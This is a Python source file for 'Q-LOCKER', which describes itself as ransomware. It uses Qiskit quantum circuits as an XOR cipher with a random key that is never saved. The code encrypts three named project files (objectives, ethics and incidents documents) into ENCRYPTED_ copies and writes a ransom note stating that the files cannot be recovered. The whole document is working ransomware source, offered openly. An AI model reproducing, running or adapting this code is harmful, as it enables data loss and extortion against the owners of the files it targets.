from qiskit import QuantumCircuit, transpile
from qiskit_aer import Aer
import os

class Q_LOCKER:
    def __init__(self, files, context = b"Q-LOCKER v1.0 (2025)"):
        """
        Initializes the ransomware with files to encrypt.
        
        Args:
            files (list): List of file paths to encrypt
            context (bytes): Context/metadata for encryption (default is version info)
        """
        self.files = files
        self.context = context
        self.key = os.urandom(16) # Generates a random 16-byte key
        
        # Sets up Qiskit's quantum simulator backend
        self.backend = Aer.get_backend("qasm_simulator")

    def bytes_to_bits(self, data):
        """Converts bytes to a list of bit strings ('0'/'1')."""
        return list(''.join(f'{byte:08b}' for byte in data))

    def bits_to_bytes(self, bits):
        """Converts a list of bits back to bytes."""
        return bytes(int(''.join(bits[i:i+8]), 2) for i in range(0, len(bits), 8))

    def generate_circuits(self, message):
        """Generates quantum circuits to encrypt the message."""
        message_binary = self.bytes_to_bits(self.context + message)
        key_binary = self.bytes_to_bits(self.key)
        
        circuits = []
        for i in range(len(message_binary)):
            circuit = QuantumCircuit(2, 2)  # 2 qubits, 2 classical bits

            if key_binary[i % len(key_binary)] == "1":
                circuit.x(0)

            if message_binary[i] == "1":
                circuit.x(1)

            circuit.cx(0, 1)

            # Measure both qubits
            circuit.measure(0, 0)
            circuit.measure(1, 1)

            circuits.append(circuit)

        return circuits

    def encrypt(self, message):
        """Encrypts a message using the generated quantum circuits."""
        circuits = self.generate_circuits(message)
        compiled = transpile(circuits, self.backend) # Compiles circuits (slow)
        
        # Executes all circuits on the simulator
        results = self.backend.run(compiled, shots = 1, memory = True).result()

        # Processes quantum measurement results
        encrypted = []
        for circuit in compiled:
            memory = results.get_memory(circuit)[0]
            encrypted_bit = memory[0] # Takes bit from "circuit.measure(1, 1)"
            encrypted.append(encrypted_bit)

        return self.bits_to_bytes(encrypted)

    def ransomware(self):
        """Executes the ransomware attack on specified files."""
        for file in self.files:
            # Reads original file
            with open(file, "rb") as f:
                open_file = f.read()
            
            # Encrypts content
            encrypted = self.encrypt(open_file)

            # Creates new encrypted file
            file_name = file.split("/")[1]
            output_filename = f"ENCRYPTED_{file_name.split('.')[0]}"
            with open(output_filename, "wb") as output_file:
                output_file.write(encrypted)

def main():
    """Main function that executes the ransomware."""
    # Target files
    FILES = [
        "proyecto_codex/objetivos.md",
        "proyecto_codex/etica.md",
        "proyecto_codex/incidentes.md"
    ]
    
    # Creates and executes ransomware
    qlocker = Q_LOCKER(FILES)
    qlocker.ransomware()

    popup = '''
        Q-Locker Ransomware v1.0

        Ooops, your files have been encrypted!

        What happened to my computer?
        - Your important files are encrypted.
            Many of your documents, photos, videos, databases and other files are
            no longer accessible because they have been encrypted with... Quantum Physics!

        - Can I recover my files?
            No.
    '''

    with open("info.txt", "w") as file:
        file.write(popup)

if __name__ == '__main__':
    main()